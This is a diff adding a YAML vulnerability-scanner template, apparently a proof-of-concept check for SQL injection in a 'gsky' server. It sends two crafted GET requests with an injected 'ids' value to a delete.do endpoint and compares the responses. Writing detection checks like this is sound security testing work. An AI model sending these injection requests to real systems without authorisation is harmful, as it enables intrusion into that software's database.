@@ -1,0 +1,24 @@
+name: yaml-poc-gsky-server-sql_injection-CT-1108574
+binding: c7078792-98bb-4feb-b1b7-e5a5724af535
+manual: false
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: 5bc3bf4d-f1ce-4c48-a9dd-42ab8418cf72
+        level: high
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /run_stop/delete.do;downloadLogger.action?ids=1)--+&loadAll=1
+        expression: response.body_string.contains('"message":"OK"')
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1
+        expression: response.body_string.contains('"result":10001')
+expression: r0() && r1()
